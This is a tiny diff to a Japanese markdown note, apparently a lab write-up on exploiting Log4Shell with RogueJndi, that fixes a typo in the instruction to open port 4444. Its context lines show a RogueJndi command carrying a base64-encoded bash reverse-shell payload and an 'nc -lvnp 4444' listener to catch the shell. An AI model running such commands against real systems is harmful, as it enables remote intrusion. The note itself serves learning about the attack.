@@ -63,7 +63,7 @@ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1p
 
 ![a754b94479dd3fbe3b1b2f00dbc3e7b5.png](../_resources/a754b94479dd3fbe3b1b2f00dbc3e7b5.png)
 
-4444ポートを海保プ
+4444ポートを解放
 
 `nc -lvnp 4444`
 
